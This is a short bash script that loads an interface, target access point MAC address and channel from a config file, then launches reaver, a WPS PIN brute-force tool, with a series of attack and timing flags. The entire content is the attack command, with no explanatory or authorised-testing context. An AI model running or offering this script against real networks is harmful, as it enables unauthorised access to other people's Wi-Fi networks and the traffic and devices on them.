#!/bin/bash

source config.txt

reaver -i $interface -b $ap_mac -c $channel -L -N -E -J -vv -d 5 -w -S -A
